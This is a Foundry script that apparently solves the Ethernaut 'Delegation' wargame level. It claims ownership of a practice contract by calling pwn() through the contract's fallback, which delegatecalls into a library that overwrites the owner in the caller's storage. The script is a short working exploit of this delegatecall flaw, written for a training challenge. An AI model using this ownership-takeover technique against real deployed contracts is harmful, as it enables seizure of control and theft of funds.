/*
The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "src/Delegation.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract DelegationSolution is Script {
    Delegation public delegation = Delegation(0xEFdFBfA0d1F388d14F642E6197c16Fb1e79c36A2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
